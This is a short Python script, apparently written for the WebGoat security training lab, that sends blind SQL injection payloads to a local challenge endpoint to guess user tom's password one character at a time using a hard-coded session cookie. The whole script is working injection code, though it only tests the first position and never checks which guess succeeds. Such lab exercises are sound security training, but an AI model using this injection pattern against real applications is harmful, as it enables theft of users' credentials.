#!/usr/bin/env python3

import requests
global res

url = 'http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/challenge'

headers = {
    'Cookie': 'JSESSIONID=USKoKRQVl6jfr-o8i9q8eRrI37xRCL80HWMgaOyl; language=en; welcomebanner_status=dismiss'
}


def send_request(payload):
    global res
    data = {
        'username_reg': payload,
        'email_reg': 'TestKees@han.nl',
        'password_reg': '12345',
        'confirm_password_reg': '12345'
    }

    res = requests.put(url, headers=headers, data=data)
    print(res.json())


charset = 'abcdefghijklmnopqrstuvwxyz'
index = 1
for c in charset:
    current_char = c
    payload = f"tom' AND substring(password,{index}, 1) ='{current_char}"
    send_request(payload)

print(res.json())
